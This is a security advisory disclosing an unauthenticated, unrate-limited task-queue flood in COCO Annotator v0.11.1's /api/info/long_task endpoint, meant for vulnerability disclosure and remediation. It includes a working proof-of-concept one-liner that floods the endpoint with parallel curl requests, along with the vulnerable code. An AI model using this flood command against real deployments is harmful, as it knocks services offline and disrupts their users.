# Unauthenticated Task Queue Flood in COCO Annotator via /api/info/long_task

| Project | Version | CNA |
| --- | --- | --- |
| Coco Annotator | **`v0.11.1`** | VulDB |

**📝 Summary**

The endpoint: `/api/info/long_task` is exposed **without authentication or rate limiting**, and allows any remote user to enqueue Celery background tasks and write entries to the database (TaskModel) on every request.

This creates a critical **Denial of Service (DoS)** vulnerability. An attacker can flood the endpoint with repeated requests, overwhelming the Celery queue and workers, bloating the database, and rendering the entire application unresponsive — even after the attack stops.

---

**🔎 Details**

➤ Vulnerable Endpoint: `/api/info/long_task`

---

**📚 PoC**

**1. Run attack flood:**

```jsx
seq 1 9999999 | xargs -n1 -P50 curl -s http://localhost:5001/api/info/long_task > /dev/null
```

**2. Observe symptoms:**

- Frontend (COCO Annotator) becomes unresponsive (“Loading datasets…” spinner indefinitely)
- HTTP requests slow down or fail:

```jsx
curl -o /dev/null -s -w "Total: %{time_total}s\n" http://localhost:5001/api/info/long_task
```

- System logs show massive task creation and MongoDB inserts
- redis-cli LLEN celery shows queue depth growing uncontrollably

**3. Even after stopping the flood (CTRL+C), system remains unusable**

**➤ Screenshots:**

![image.png](image.png)

---

**📦 Affected Code**

```jsx
@api.route('/long_task')
class TaskTest(Resource):
    def get(self):
        task_model = TaskModel(group="test", name="Testing Celery")
        task_model.save()
        task = long_task.delay(20, task_model.id)
        return {'id': task.id, 'state': task.state}
```

Missing: @login_required, @limiter.limit(...)

---

**⚠️ Impact**

A remote unauthenticated attacker can:

- Enqueue thousands or millions of background tasks (long_task.delay(...))
- Inflate the backend MongoDB with arbitrary TaskModel entries
- Exhaust all Celery workers and queue backlog (e.g., Redis/RabbitMQ)
- Cause **complete DoS**, blocking all frontend usage (e.g., dataset loading)
- Persist residual effects unless the task queue and DB are manually cleared

> Note: Even after stopping the attack, the system remains degraded due to the backlog of tasks being processed.
> 

---

**🔗 References**

- https://cwe.mitre.org/data/definitions/306.html
- https://cwe.mitre.org/data/definitions/400.html
- https://owasp.org/Top10/A05_2021-Security_Misconfiguration/

---

**🕵🏻‍♀️ Finder**

*Discovered by Thoropass Researcher Natan Morette*